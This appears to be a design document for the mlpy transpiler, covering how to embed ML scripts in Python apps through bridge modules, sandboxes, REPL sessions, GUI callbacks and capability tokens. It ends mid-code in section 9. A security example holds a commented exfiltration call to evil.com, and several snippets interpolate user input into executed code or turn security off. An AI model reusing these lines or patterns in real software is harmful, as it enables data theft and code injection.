# ML-Python Integration Patterns: Complete Analysis

**Document Version:** 1.0
**Date:** January 2025
**Status:** Production-Ready System Analysis

## Executive Summary

This document provides a comprehensive analysis of integration patterns for embedding ML code within Python applications. It covers:

- **Current Capabilities:** What works out-of-the-box
- **Implementation Patterns:** How to expose Python functions to ML
- **Execution Modes:** Different ways to run ML code from Python
- **Callback Patterns:** Using ML for event handlers and GUI integration
- **Error Handling:** ML-to-Python error propagation and debugging
- **Missing Features:** What needs to be implemented
- **Security:** Capability-based access control for integrated systems

---

## Table of Contents

1. [Current Integration Capabilities](#1-current-integration-capabilities)
2. [Exposing Python Functions to ML](#2-exposing-python-functions-to-ml)
3. [ML Code Execution Patterns](#3-ml-code-execution-patterns)
4. [Callback and Event Handler Patterns](#4-callback-and-event-handler-patterns)
5. [Error Reporting and Debugging](#5-error-reporting-and-debugging)
6. [GUI Control from ML](#6-gui-control-from-ml)
7. [Missing Features and Implementation Roadmap](#7-missing-features-and-implementation-roadmap)
8. [Security and Capability Management](#8-security-and-capability-management)
9. [Production Deployment Considerations](#9-production-deployment-considerations)
10. [Complete Integration Examples](#10-complete-integration-examples)

---

## 1. Current Integration Capabilities

### 1.1 What EXISTS and Works

The mlpy transpiler provides production-ready integration capabilities:

#### **A. Transpiler API**
```python
from mlpy.ml.transpiler import MLTranspiler, transpile_ml_code

# Create transpiler instance
transpiler = MLTranspiler()

# Transpile ML code to Python
python_code, issues, source_map = transpiler.transpile_to_python(
    ml_source_code,
    source_file="app_script.ml",
    strict_security=True,
    generate_source_maps=True
)

# Execute transpiled code
if python_code:
    exec(python_code, namespace)
```

**Features:**
- Full ML→Python transpilation
- Security analysis integrated
- Source map generation for debugging
- Import system with bridge modules
- Cache support for performance

#### **B. Sandbox Execution**
```python
from mlpy.ml.transpiler import execute_ml_code_sandbox
from mlpy.runtime.sandbox import SandboxConfig
from mlpy.runtime.capabilities.tokens import CapabilityToken
from mlpy.runtime.capabilities.manager import file_capability_context

# Configure sandbox
config = SandboxConfig(
    memory_limit="100MB",
    cpu_timeout=30.0,
    network_disabled=True
)

# Execute with capabilities
with file_capability_context(["*.txt"], {"read"}):
    result, issues = execute_ml_code_sandbox(
        ml_code,
        sandbox_config=config,
        strict_security=True
    )

if result.success:
    print(f"Return value: {result.return_value}")
    print(f"Output: {result.stdout}")
```

**Features:**
- Process-level isolation
- Resource limits (memory, CPU, disk)
- Capability-based security
- Network restriction
- Resource monitoring

#### **C. REPL Integration**
```python
from mlpy.cli.repl import MLREPLSession

# Create persistent REPL session
session = MLREPLSession(security_enabled=True)

# Execute ML code incrementally
result = session.execute_ml_line("x = 42;")
result = session.execute_ml_line("y = x + 10;")
result = session.execute_ml_line("y")

print(f"Result: {result.value}")  # 52

# Get all variables
variables = session.get_variables()
```

**Features:**
- Persistent namespace across executions
- Incremental compilation (O(1) per statement)
- Symbol tracking for auto-completion
- Capability management per session
- Error recovery with .retry command

#### **D. Standard Library Bridge System**
```python
from mlpy.stdlib.decorators import ml_module, ml_function

@ml_module(
    name="mymodule",
    description="Custom Python module for ML",
    capabilities=["custom.access"]
)
class MyModule:
    @ml_function(
        description="Custom operation",
        params=[{"name": "x", "type": "number"}],
        returns="number"
    )
    @staticmethod
    def custom_op(x: float) -> float:
        return x * 2.5

# ML code can now use:
# import mymodule;
# result = mymodule.custom_op(10);  // Returns 25.0
```

**Features:**
- Decorator-based module creation
- Automatic metadata extraction
- Capability integration
- Safe attribute registry integration

### 1.2 File Structure for Integration

```
your_project/
├── python_app/
│   ├── main.py              # Main Python application
│   ├── ml_integration.py    # ML integration layer
│   └── ml_modules/          # Custom ML bridge modules
│       └── custom_ops.py    # Python functions exposed to ML
├── ml_scripts/
│   ├── business_logic.ml    # ML scripts for business logic
│   ├── data_processing.ml   # ML data processing scripts
│   └── validators.ml        # ML validation rules
└── config/
    └── capabilities.json    # Capability configuration
```

---

## 2. Exposing Python Functions to ML

### 2.1 Standard Library Bridge Pattern (RECOMMENDED)

This is the **production-ready** approach for exposing Python functions to ML.

#### **Step 1: Create Bridge Module**

```python
# src/your_app/ml_modules/app_bridge.py

from mlpy.stdlib.decorators import ml_module, ml_function, ml_class
import your_business_logic as _bl  # Underscore prefix to avoid ML conflicts

@ml_module(
    name="app",
    description="Application-specific operations for ML",
    capabilities=["app.read", "app.write"],
    version="1.0.0"
)
class AppModule:
    """Bridge between Python app and ML code."""

    @ml_function(
        description="Validate user input",
        capabilities=["app.read"],
        params=[
            {"name": "username", "type": "str", "description": "Username to validate"},
            {"name": "email", "type": "str", "description": "Email to validate"}
        ],
        returns="object"
    )
    @staticmethod
    def validate_user(username: str, email: str) -> dict:
        """Validate user credentials."""
        return {
            "valid": _bl.check_username(username) and _bl.check_email(email),
            "username_ok": _bl.check_username(username),
            "email_ok": _bl.check_email(email)
        }

    @ml_function(
        description="Process payment",
        capabilities=["app.write", "payment.process"],
        params=[
            {"name": "amount", "type": "number"},
            {"name": "currency", "type": "str"}
        ],
        returns="object"
    )
    @staticmethod
    def process_payment(amount: float, currency: str) -> dict:
        """Process a payment transaction."""
        try:
            transaction_id = _bl.charge_payment(amount, currency)
            return {
                "success": True,
                "transaction_id": transaction_id
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }

    @ml_function(
        description="Get user profile",
        capabilities=["app.read", "db.read"]
    )
    @staticmethod
    def get_user_profile(user_id: int) -> dict:
        """Fetch user profile from database."""
        user = _bl.db.get_user(user_id)
        return {
            "id": user.id,
            "name": user.name,
            "email": user.email,
            "created_at": user.created_at.isoformat()
        }

# Create module instance
app = AppModule()

__all__ = ["AppModule", "app"]
```

#### **Step 2: Register Module**

```python
# src/your_app/ml_integration.py

from mlpy.ml.codegen.safe_attribute_registry import SafeAttributeRegistry
from your_app.ml_modules.app_bridge import AppModule

def setup_ml_environment():
    """Set up ML environment with custom modules."""

    # Get safe attribute registry
    registry = SafeAttributeRegistry()

    # Register module methods
    from mlpy.ml.codegen.safe_attribute_registry import SafeAttribute, AttributeAccessType

    app_methods = {
        "validate_user": SafeAttribute(
            "validate_user",
            AttributeAccessType.METHOD,
            ["app.read"],
            "Validate user credentials"
        ),
        "process_payment": SafeAttribute(
            "process_payment",
            AttributeAccessType.METHOD,
            ["app.write", "payment.process"],
            "Process payment transaction"
        ),
        "get_user_profile": SafeAttribute(
            "get_user_profile",
            AttributeAccessType.METHOD,
            ["app.read", "db.read"],
            "Get user profile from database"
        )
    }

    registry.register_custom_class("AppModule", app_methods)
```

#### **Step 3: Add to Code Generator**

```python
# Modify src/mlpy/ml/codegen/python_generator.py
# In visit_import() method, add your module:

if module_path in ["math", "json", "datetime", "app"]:  # Add "app"
    self.imports.add(
        f"from your_app.ml_modules.app_bridge import app"
    )
```

#### **Step 4: Use in ML Code**

```javascript
// ml_scripts/user_validation.ml

import app;

function validate_and_register(username, email) {
    // Call Python function from ML
    validation = app.validate_user(username, email);

    if (validation.valid) {
        print("User validation passed!");
        return { success: true };
    } else {
        errors = [];
        if (!validation.username_ok) {
            errors.push("Invalid username");
        }
        if (!validation.email_ok) {
            errors.push("Invalid email");
        }
        return { success: false, errors: errors };
    }
}
```

### 2.2 Direct Namespace Injection (Quick & Dirty)

For prototyping or trusted environments, you can inject Python functions directly into the execution namespace:

```python
def quick_integration_pattern():
    """Quick integration without bridge module."""

    from mlpy.ml.transpiler import MLTranspiler

    # Your Python functions
    def calculate_discount(price: float, tier: str) -> float:
        """Calculate discount based on customer tier."""
        rates = {"gold": 0.3, "silver": 0.15, "bronze": 0.05}
        return price * (1 - rates.get(tier, 0))

    def send_notification(user_id: int, message: str) -> bool:
        """Send notification to user."""
        print(f"Notification to user {user_id}: {message}")
        return True

    # Transpile ML code
    ml_code = '''
        // ML code using Python functions
        price = 100;
        tier = "gold";
        final_price = calculate_discount(price, tier);
        send_notification(123, "Your discount: " + final_price);
    '''

    transpiler = MLTranspiler()
    python_code, issues, _ = transpiler.transpile_to_python(ml_code)

    if python_code:
        # Create namespace with Python functions
        namespace = {
            "calculate_discount": calculate_discount,
            "send_notification": send_notification
        }

        # Execute ML code with access to Python functions
        exec(python_code, namespace)
```

**⚠️ WARNINGS:**
- No security analysis on function calls
- No capability enforcement
- No safe attribute checking
- Bypasses sandbox isolation
- **Use ONLY for prototyping or fully trusted environments**

### 2.3 Capability-Aware Function Wrapper

For production use without full bridge module, wrap functions with capability checks:

```python
from mlpy.runtime.capabilities.decorators import requires_capability

@requires_capability("database.read")
def get_user_data(user_id: int) -> dict:
    """Fetch user data with capability check."""
    return db.users.get(user_id)

@requires_capability("payment.process")
def charge_card(amount: float, card_token: str) -> str:
    """Process payment with capability check."""
    return payment_gateway.charge(amount, card_token)
```

---

## 3. ML Code Execution Patterns

### 3.1 Direct Transpilation + exec()

**Use Case:** Maximum performance, trusted environment

```python
def direct_execution_pattern():
    """Execute ML with direct transpilation."""
    from mlpy.ml.transpiler import MLTranspiler

    transpiler = MLTranspiler()

    ml_code = '''
        function fibonacci(n) {
            if (n <= 1) { return n; }
            return fibonacci(n - 1) + fibonacci(n - 2);
        }
        result = fibonacci(10);
    '''

    python_code, issues, source_map = transpiler.transpile_to_python(
        ml_code,
        strict_security=True,
        generate_source_maps=True
    )

    if python_code:
        namespace = {}
        exec(python_code, namespace)

        result = namespace.get("result")
        print(f"Fibonacci(10) = {result}")
    else:
        for issue in issues:
            print(f"Security issue: {issue.error.message}")
```

**Advantages:**
- Fastest execution (no process overhead)
- Direct namespace access
- Simple debugging with source maps

**Disadvantages:**
- No process isolation
- Same memory space as host
- Security relies only on static analysis

### 3.2 Sandbox Execution

**Use Case:** Untrusted code, production environment

```python
def sandbox_execution_pattern():
    """Execute ML in isolated sandbox."""
    from mlpy.ml.transpiler import execute_ml_code_sandbox
    from mlpy.runtime.sandbox import SandboxConfig
    from mlpy.runtime.capabilities.manager import get_capability_manager

    ml_code = '''
        import json;
        data = { name: "Alice", score: 95 };
        result = json.stringify(data);
    '''

    # Configure sandbox
    config = SandboxConfig(
        memory_limit="50MB",
        cpu_timeout=10.0,
        network_disabled=True,
        strict_mode=True
    )

    # Set up capabilities
    manager = get_capability_manager()
    ctx = manager.create_context("ml_execution")
    # (Capabilities are added as needed)

    # Execute
    result, issues = execute_ml_code_sandbox(
        ml_code,
        sandbox_config=config,
        context=ctx,
        strict_security=True
    )

    if result.success:
        print(f"Result: {result.return_value}")
        print(f"Memory used: {result.memory_usage / 1024 / 1024:.1f}MB")
        print(f"CPU time: {result.execution_time:.2f}s")
    else:
        print(f"Error: {result.error}")
```

**Advantages:**
- True process isolation
- Resource limits enforced
- Memory/CPU monitoring
- Network isolation

**Disadvantages:**
- Slower (process spawn overhead)
- No shared memory with host
- Serialization overhead for data passing

### 3.3 REPL Session (Interactive)

**Use Case:** Long-running applications, gradual script execution

```python
def repl_session_pattern():
    """Use REPL session for persistent ML environment."""
    from mlpy.cli.repl import MLREPLSession

    # Create session
    session = MLREPLSession(security_enabled=True)

    # Execute ML code line by line
    session.execute_ml_line("config = { timeout: 30, retries: 3 };")
    session.execute_ml_line("function process(data) { return data.length; }")

    # Later in application...
    result = session.execute_ml_line("items = [1, 2, 3, 4, 5];")
    result = session.execute_ml_line("count = process(items);")

    if result.success:
        print(f"Count: {result.value}")

    # Access variables
    variables = session.get_variables()
    print(f"All variables: {variables}")

    # Grant capabilities dynamically
    session.grant_capability("file.read")

    # Continue execution with new capabilities
    session.execute_ml_line("""
        import file;
        content = file.read("data.txt");
    """)
```

**Advantages:**
- Persistent namespace across calls
- Incremental compilation (fast)
- Dynamic capability management
- Error recovery (.retry command)

**Disadvantages:**
- Same process as host (no isolation)
- State management complexity
- Memory accumulation over time

### 3.4 Cached Execution

**Use Case:** Repeated execution of same ML scripts

```python
def cached_execution_pattern():
    """Execute ML with caching for performance."""
    from mlpy.ml.transpiler import transpile_ml_file
    from pathlib import Path

    ml_file = Path("scripts/validator.ml")

    # First execution: transpiles and caches
    python_code, issues, source_map = transpile_ml_file(
        str(ml_file),
        strict_security=True,
        generate_source_maps=True
    )

    # Creates validator.py and validator.py.map alongside validator.ml

    # Subsequent executions: uses cached .py file
    # (automatic if .py is newer than .ml)

    if python_code:
        namespace = {}
        exec(python_code, namespace)

        # Call ML functions
        validate = namespace.get("validate_input")
        result = validate("test@example.com")
```

**Advantages:**
- Very fast on cache hit
- Automatic cache invalidation
- Source map caching included

**Disadvantages:**
- Disk I/O dependency
- Cache invalidation edge cases
- Not suitable for dynamic ML code

---

## 4. Callback and Event Handler Patterns

### 4.1 Current Limitations

**What's NOT Currently Supported:**
- Direct ML function references as Python callbacks
- Async/await in ML code
- ML generators/iterators
- ML closures capturing Python state

**What CAN Be Done (Workarounds):**
- Execute ML code on events with string-based function calls
- Pass data to ML, get results synchronously
- Use REPL session for stateful event handling

### 4.2 GUI Event Handler Pattern (Workaround)

```python
def gui_event_handler_pattern():
    """Use ML for GUI event handlers (workaround)."""
    import tkinter as tk
    from mlpy.cli.repl import MLREPLSession

    # Create REPL session for stateful ML environment
    session = MLREPLSession(security_enabled=False)  # GUI is trusted

    # Define ML event handlers
    ml_handlers = '''
        state = { count: 0 };

        function on_button_click() {
            state.count = state.count + 1;
            return "Clicked " + state.count + " times";
        }

        function on_text_change(text) {
            length = text.length;
            if (length > 100) {
                return { valid: false, message: "Too long!" };
            } else {
                return { valid: true, message: "OK" };
            }
        }
    '''

    session.execute_ml_line(ml_handlers)

    # Create GUI
    root = tk.Tk()
    label = tk.Label(root, text="Count: 0")
    label.pack()

    def python_button_handler():
        """Python callback that invokes ML function."""
        result = session.execute_ml_line("on_button_click();")
        if result.success:
            label.config(text=result.value)

    button = tk.Button(root, text="Click Me", command=python_button_handler)
    button.pack()

    # Text validation
    entry = tk.Entry(root)
    entry.pack()

    status_label = tk.Label(root, text="")
    status_label.pack()

    def python_text_handler(event):
        """Python callback for text changes."""
        text = entry.get()
        result = session.execute_ml_line(f'on_text_change("{text}");')
        if result.success:
            validation = result.value
            status_label.config(text=validation["message"])

    entry.bind("<KeyRelease>", python_text_handler)

    root.mainloop()
```

**How It Works:**
1. Define ML handler functions in REPL session
2. Python GUI callbacks invoke ML functions via REPL
3. ML state persists in REPL session
4. Results returned to Python for UI updates

**Limitations:**
- Two-step invocation (Python → ML → Python)
- No direct ML function references
- Synchronous only (blocks UI thread)

### 4.3 Server Request Handler Pattern

```python
from flask import Flask, request, jsonify
from mlpy.cli.repl import MLREPLSession

app = Flask(__name__)

# Create persistent ML session for request handling
ml_session = MLREPLSession(security_enabled=True)

# Load ML request handlers
ml_handlers = '''
    function validate_order(order) {
        // Complex validation logic in ML
        if (!order.items || order.items.length == 0) {
            return { valid: false, error: "No items" };
        }

        total = 0;
        for (i = 0; i < order.items.length; i = i + 1) {
            item = order.items[i];
            if (item.price < 0) {
                return { valid: false, error: "Invalid price" };
            }
            total = total + item.price * item.quantity;
        }

        return { valid: true, total: total };
    }

    function calculate_shipping(address, weight) {
        // Shipping calculation logic
        base_rate = 5.0;
        per_kg = 2.5;

        if (address.country == "US") {
            return base_rate + weight * per_kg;
        } else {
            return (base_rate + weight * per_kg) * 1.5;
        }
    }
'''

ml_session.execute_ml_line(ml_handlers)

@app.route('/api/validate_order', methods=['POST'])
def validate_order():
    """API endpoint using ML validation."""
    order_data = request.json

    # Convert Python dict to ML object literal
    ml_code = f"validate_order({json.dumps(order_data)});"

    result = ml_session.execute_ml_line(ml_code)

    if result.success and result.value:
        return jsonify(result.value)
    else:
        return jsonify({"error": str(result.error)}), 400

@app.route('/api/calculate_shipping', methods=['POST'])
def calculate_shipping():
    """API endpoint using ML calculation."""
    data = request.json

    ml_code = f"""
        calculate_shipping(
            {json.dumps(data['address'])},
            {data['weight']}
        );
    """

    result = ml_session.execute_ml_line(ml_code)

    if result.success:
        return jsonify({"shipping_cost": result.value})
    else:
        return jsonify({"error": str(result.error)}), 400

if __name__ == '__main__':
    app.run()
```

**Advantages:**
- Business logic in ML scripts
- Hot-reloadable by restarting REPL session
- Persistent state for caching
- Easier testing of business rules

**Considerations:**
- Thread safety (REPL is single-threaded)
- Consider worker pool for concurrent requests
- ML state isolation per request

---

## 5. Error Reporting and Debugging

### 5.1 Error Propagation: ML → Python

```python
def error_handling_pattern():
    """Handle ML errors in Python code."""
    from mlpy.ml.transpiler import MLTranspiler
    from mlpy.ml.errors.context import ErrorContext
    from mlpy.debugging.error_formatter import error_formatter

    transpiler = MLTranspiler()

    ml_code = '''
        function divide(a, b) {
            if (b == 0) {
                throw "Division by zero!";
            }
            return a / b;
        }

        result = divide(10, 0);  // Will throw error
    '''

    python_code, issues, source_map = transpiler.transpile_to_python(
        ml_code,
        source_file="calculation.ml",
        generate_source_maps=True
    )

    if python_code:
        try:
            namespace = {}
            exec(python_code, namespace)
        except Exception as py_error:
            # Python exception from ML code
            print(f"Runtime error: {py_error}")

            # Trace back to ML source using source map
            if source_map:
                # Find ML source location
                for mapping in source_map.get("mappings", []):
                    print(f"ML line {mapping['original_line']}, "
                          f"Python line {mapping['generated_line']}")

    # Security issues are in 'issues' list
    if issues:
        print(f"\nSecurity issues found: {len(issues)}")
        error_formatter.print_multiple_errors(issues)
```

### 5.2 Source Map Debugging

```python
def source_map_debugging():
    """Use source maps for debugging ML code."""
    from mlpy.ml.transpiler import MLTranspiler
    from mlpy.debugging.source_map_index import SourceMapIndex
    from mlpy.debugging.enhanced_source_maps import EnhancedSourceMap

    transpiler = MLTranspiler()

    ml_code = open("complex_script.ml").read()

    python_code, issues, source_map_data = transpiler.transpile_to_python(
        ml_code,
        source_file="complex_script.ml",
        generate_source_maps=True
    )

    if python_code and source_map_data:
        # Create source map index
        source_map = EnhancedSourceMap.from_dict(source_map_data)
        index = SourceMapIndex.from_source_map(source_map, python_code)

        # When Python error occurs at line X
        python_line = 42

        # Find corresponding ML line
        ml_location = index.get_ml_location(python_line)

        if ml_location:
            print(f"Python line {python_line} → "
                  f"ML line {ml_location.line}, column {ml_location.column}")

            # Show ML source context
            ml_lines = ml_code.splitlines()
            context_start = max(0, ml_location.line - 3)
            context_end = min(len(ml_lines), ml_location.line + 2)

            print("\nML Source Context:")
            for i in range(context_start, context_end):
                marker = "→" if i == ml_location.line - 1 else " "
                print(f"{marker} {i+1:4d} | {ml_lines[i]}")
```

### 5.3 Interactive Debugging with DAP

```python
def interactive_debugging():
    """Debug ML code interactively."""
    from mlpy.debugging.debugger import MLDebugger
    from mlpy.debugging.source_map_index import SourceMapIndex

    # This is typically done via CLI: mlpy debug script.ml
    # But can be invoked programmatically:

    ml_file = "algorithm.ml"
    ml_code = open(ml_file).read()

    # Transpile with source maps
    from mlpy.ml.transpiler import MLTranspiler
    transpiler = MLTranspiler()

    python_code, _, source_map_data = transpiler.transpile_to_python(
        ml_code,
        source_file=ml_file,
        generate_source_maps=True
    )

    # Create debugger
    if python_code and source_map_data:
        # Source map index
        from mlpy.debugging.enhanced_source_maps import EnhancedSourceMap
        source_map = EnhancedSourceMap.from_dict(source_map_data)
        index = SourceMapIndex.from_source_map(source_map, python_code)

        # Create debugger
        debugger = MLDebugger(ml_file, index, python_code)

        # Set breakpoints
        debugger.set_breakpoint(10)  # ML line 10
        debugger.set_breakpoint(25)  # ML line 25

        # Run with pause callback
        def on_pause():
            print(f"Paused at ML line {debugger.current_ml_line}")
            debugger.show_source_context()

            # Inspect variables
            frame_vars = debugger.get_frame_variables()
            for name, value in frame_vars.items():
                print(f"  {name} = {value}")

            # Continue or step
            input("Press Enter to continue...")

        debugger.on_pause = on_pause
        debugger.run()
```

---

## 6. GUI Control from ML

### 6.1 Current State: LIMITED

**What's NOT Possible:**
- Direct widget creation from ML
- Direct event binding from ML
- Async UI updates from ML

**What IS Possible (via Bridge):**
- ML code calls Python functions that manipulate GUI
- Python exposes GUI control functions to ML via bridge
- ML business logic triggers GUI updates through return values

### 6.2 GUI Bridge Pattern

```python
# File: ml_modules/gui_bridge.py

import tkinter as tk
from mlpy.stdlib.decorators import ml_module, ml_function

# Global GUI state (in real app, use proper state management)
_gui_state = {
    "root": None,
    "widgets": {}
}

@ml_module(
    name="gui",
    description="GUI control bridge for ML",
    capabilities=["gui.update"]
)
class GUIModule:
    """Bridge for GUI control from ML."""

    @ml_function(
        description="Update label text",
        capabilities=["gui.update"]
    )
    @staticmethod
    def update_label(label_id: str, text: str) -> bool:
        """Update label text from ML."""
        if label_id in _gui_state["widgets"]:
            widget = _gui_state["widgets"][label_id]
            widget.config(text=text)
            return True
        return False

    @ml_function(
        description="Show message dialog",
        capabilities=["gui.update"]
    )
    @staticmethod
    def show_message(title: str, message: str) -> bool:
        """Show message dialog from ML."""
        from tkinter import messagebox
        messagebox.showinfo(title, message)
        return True

    @ml_function(
        description="Enable/disable button",
        capabilities=["gui.update"]
    )
    @staticmethod
    def set_button_enabled(button_id: str, enabled: bool) -> bool:
        """Enable or disable button from ML."""
        if button_id in _gui_state["widgets"]:
            widget = _gui_state["widgets"][button_id]
            state = "normal" if enabled else "disabled"
            widget.config(state=state)
            return True
        return False

gui = GUIModule()

def register_widget(widget_id: str, widget: tk.Widget):
    """Register widget for ML access."""
    _gui_state["widgets"][widget_id] = widget

def set_root(root: tk.Tk):
    """Set root window."""
    _gui_state["root"] = root

__all__ = ["GUIModule", "gui", "register_widget", "set_root"]
```

**Usage:**

```python
# main.py

import tkinter as tk
from mlpy.cli.repl import MLREPLSession
from ml_modules.gui_bridge import gui, register_widget, set_root

# Create GUI
root = tk.Tk()
set_root(root)

label = tk.Label(root, text="Initial text")
label.pack()
register_widget("main_label", label)

button = tk.Button(root, text="Click Me")
button.pack()
register_widget("main_button", button)

# Create ML session
ml_session = MLREPLSession(security_enabled=False)

# Load ML GUI control logic
ml_gui_logic = '''
    import gui;

    click_count = 0;

    function handle_button_click() {
        click_count = click_count + 1;

        text = "Clicked " + click_count + " times";
        gui.update_label("main_label", text);

        if (click_count >= 5) {
            gui.set_button_enabled("main_button", false);
            gui.show_message("Limit Reached", "You clicked 5 times!");
        }
    }
'''

ml_session.execute_ml_line(ml_gui_logic)

def python_button_handler():
    """Python button callback invoking ML logic."""
    ml_session.execute_ml_line("handle_button_click();")

button.config(command=python_button_handler)

root.mainloop()
```

### 6.3 Proposed GUI Module (Future Enhancement)

```javascript
// FUTURE: Direct GUI control from ML (NOT YET IMPLEMENTED)

import gui;

// Create window
window = gui.createWindow({
    title: "My App",
    width: 800,
    height: 600
});

// Create widgets
label = gui.createLabel(window, {
    text: "Hello, World!",
    fontSize: 16
});

button = gui.createButton(window, {
    text: "Click Me",
    onClick: function() {
        label.setText("Button clicked!");
    }
});

// Layout
gui.layout(window, {
    type: "vertical",
    children: [label, button]
});

// Show window
window.show();
```

**Implementation Requirements:**
1. Full widget abstraction in bridge
2. Event loop integration
3. Async callback support
4. Thread-safe GUI updates
5. Widget lifecycle management

---

## 7. Missing Features and Implementation Roadmap

### Priority 1: Essential for Production

#### **1.1 Python Function Auto-Export Decorator**

**Problem:** Current bridge system is verbose (6 files to modify per module)

**Solution:**
```python
from mlpy.integration import ml_export

@ml_export(
    module="myapp",
    description="Calculate discount",
    capabilities=["pricing.read"]
)
def calculate_discount(price: float, customer_tier: str) -> float:
    """Calculate customer discount."""
    rates = {"gold": 0.3, "silver": 0.15, "bronze": 0.05}
    return price * (1 - rates.get(customer_tier, 0))

# Auto-registers with:
# - Safe attribute registry
# - Code generator
# - Module system
```

**Effort:** Medium (2-3 days)
**Impact:** High (drastically simplifies integration)

#### **1.2 ML-as-Callback Helper System**

**Problem:** No clean way to use ML functions as Python callbacks

**Solution:**
```python
from mlpy.integration import ml_callback

# Create ML callback wrapper
@ml_callback
def create_validator():
    ml_code = '''
        function validate(data) {
            return data.email.includes("@") && data.name.length > 3;
        }
    '''
    return ml_code, "validate"

# Use as normal Python callback
validator = create_validator()

# Works with GUI, Flask, etc.
button.config(command=lambda: validator({"email": "test@example.com", "name": "Alice"}))
```

**Effort:** Medium (3-4 days)
**Impact:** High (enables event-driven architectures)

#### **1.3 Async ML Execution**

**Problem:** All ML execution is synchronous, blocks Python thread

**Solution:**
```python
from mlpy.integration import async_ml_execute
import asyncio

async def async_pattern():
    ml_code = '''
        // Long-running computation
        result = expensive_calculation();
    '''

    # Non-blocking execution
    result = await async_ml_execute(ml_code, timeout=30.0)
    print(f"Result: {result}")

asyncio.run(async_pattern())
```

**Effort:** High (5-7 days)
**Impact:** Critical (enables server/GUI integration without blocking)

### Priority 2: Enhanced Developer Experience

#### **2.1 Type Bridge (Python ↔ ML)**

**Problem:** No type information sharing between Python and ML

**Solution:**
```python
from mlpy.integration import ml_type_bridge
from typing import TypedDict

class UserProfile(TypedDict):
    name: str
    email: str
    age: int

@ml_type_bridge(UserProfile)
def process_user(profile: UserProfile) -> dict:
    """Python function with type info for ML."""
    # Type information automatically available in ML
    return {"processed": True}

# ML side can use type checking:
# profile = { name: "Alice", email: "alice@example.com", age: 30 };
# result = process_user(profile);  // Type checked!
```

**Effort:** High (7-10 days)
**Impact:** Medium (improves reliability, not blocking)

#### **2.2 Hot Reload for ML Scripts**

**Problem:** Changing ML scripts requires application restart

**Solution:**
```python
from mlpy.integration import MLHotReloader

reloader = MLHotReloader(watch_dir="ml_scripts/")

@reloader.watch("business_logic.ml")
def on_reload(new_namespace):
    """Called when ML script changes."""
    global validate_order
    validate_order = new_namespace["validate_order"]
    print("business_logic.ml reloaded!")

reloader.start()  # Watches for file changes
```

**Effort:** Medium (3-5 days)
**Impact:** High (development speed)

### Priority 3: Advanced Patterns

#### **3.1 ML Plugin Architecture**

**Problem:** No formal system for ML-based application plugins

**Solution:**
```python
from mlpy.integration import MLPluginManager

manager = MLPluginManager(plugins_dir="plugins/")

# Plugins are ML modules with metadata
# plugins/my_plugin.ml:
# @plugin {
#     name: "My Plugin",
#     version: "1.0.0",
#     dependencies: ["http", "json"]
# }
# export function init() { ... }
# export function handle_request(req) { ... }

manager.load_all_plugins()

# Use plugin
plugin = manager.get_plugin("My Plugin")
result = plugin.call("handle_request", request_data)
```

**Effort:** High (7-10 days)
**Impact:** Medium (enables ecosystem)

#### **3.2 ML Generators/Iterators**

**Problem:** No lazy evaluation or streaming from ML

**Solution:**
```javascript
// ML side:
function* generate_numbers(n) {
    for (i = 0; i < n; i = i + 1) {
        yield i * i;
    }
}

// Python side:
for value in ml_generator("generate_numbers", 10):
    print(value)  // 0, 1, 4, 9, 16, ...
```

**Effort:** Very High (10-15 days)
**Impact:** Low (niche use case)

---

## 8. Security and Capability Management

### 8.1 Capability-Based Integration

```python
def capability_aware_integration():
    """Integrate ML with fine-grained capabilities."""
    from mlpy.runtime.capabilities.manager import get_capability_manager
    from mlpy.runtime.capabilities.tokens import create_capability_token

    manager = get_capability_manager()

    # Define capabilities for ML code
    file_read_token = create_capability_token(
        capability_type="file",
        resource_patterns=["data/*.csv"],
        allowed_operations={"read"},
        description="Read CSV data files"
    )

    db_read_token = create_capability_token(
        capability_type="database",
        resource_patterns=["users", "products"],
        allowed_operations={"read"},
        description="Read database tables"
    )

    # NO write or network access

    # Create context with limited capabilities
    ctx = manager.create_context("ml_data_processing")
    ctx.add_capability(file_read_token)
    ctx.add_capability(db_read_token)

    # Execute ML with restricted access
    from mlpy.ml.transpiler import execute_ml_code_sandbox
    from mlpy.runtime.sandbox import SandboxConfig

    ml_code = '''
        import file;
        import db;

        // Can read files and DB
        data = file.read("data/sales.csv");
        users = db.query("SELECT * FROM users");

        // CANNOT write files or access network
        // file.write("data/output.csv", data);  // Would fail
        // http.get("https://evil.com/steal");  // Would fail
    '''

    config = SandboxConfig(
        memory_limit="200MB",
        cpu_timeout=60.0,
        network_disabled=True,
        strict_mode=True
    )

    result, issues = execute_ml_code_sandbox(
        ml_code,
        context=ctx,
        sandbox_config=config,
        strict_security=True
    )

    if result.success:
        print("ML code executed within security boundaries")
    else:
        print(f"Security violation: {result.error}")
```

### 8.2 Capability Design Patterns

#### **Pattern 1: Least Privilege**

```python
# Grant only what's needed
def least_privilege_pattern(ml_script: str):
    """Execute ML with minimal capabilities."""

    # Analyze what ML code actually needs
    required_caps = analyze_ml_capabilities(ml_script)

    # Create tokens only for required capabilities
    tokens = []
    if "file.read" in required_caps:
        tokens.append(create_file_read_token(patterns=["data/*.json"]))

    if "database.read" in required_caps:
        tokens.append(create_db_read_token(tables=["users"]))

    # Execute with minimal capabilities
    ctx = create_context_with_tokens(tokens)
    execute_ml_code_sandbox(ml_script, context=ctx)
```

#### **Pattern 2: Time-Limited Capabilities**

```python
from mlpy.runtime.capabilities.tokens import create_capability_token
import time

def time_limited_capability():
    """Create capability that expires after 1 hour."""

    token = create_capability_token(
        capability_type="api",
        resource_patterns=["https://api.example.com/*"],
        allowed_operations={"get"},
        expires_at=time.time() + 3600  # 1 hour from now
    )

    # After 1 hour, capability is invalid
    return token
```

#### **Pattern 3: Request-Scoped Capabilities**

```python
from flask import Flask, request
from mlpy.runtime.capabilities.manager import get_capability_manager

app = Flask(__name__)

@app.route('/api/process', methods=['POST'])
def process_request():
    """Each request gets isolated capabilities."""

    manager = get_capability_manager()

    # Create request-specific context
    request_id = str(uuid.uuid4())
    ctx = manager.create_context(f"request_{request_id}")

    # Add capabilities based on authenticated user
    user = authenticate_user(request)
    if user.has_permission("database.read"):
        ctx.add_capability(create_db_read_token())

    # Execute ML with request-scoped capabilities
    ml_code = request.json["ml_code"]
    result, _ = execute_ml_code_sandbox(ml_code, context=ctx)

    # Clean up context after request
    manager.destroy_context(f"request_{request_id}")

    return jsonify({"result": result.return_value})
```

---

## 9. Production Deployment Considerations

### 9.1 Performance Optimization

```python
def production_optimizations():
    """Optimizations for production ML integration."""

    # 1. Pre-compile ML scripts
    from mlpy.ml.transpiler import transpile_ml_file

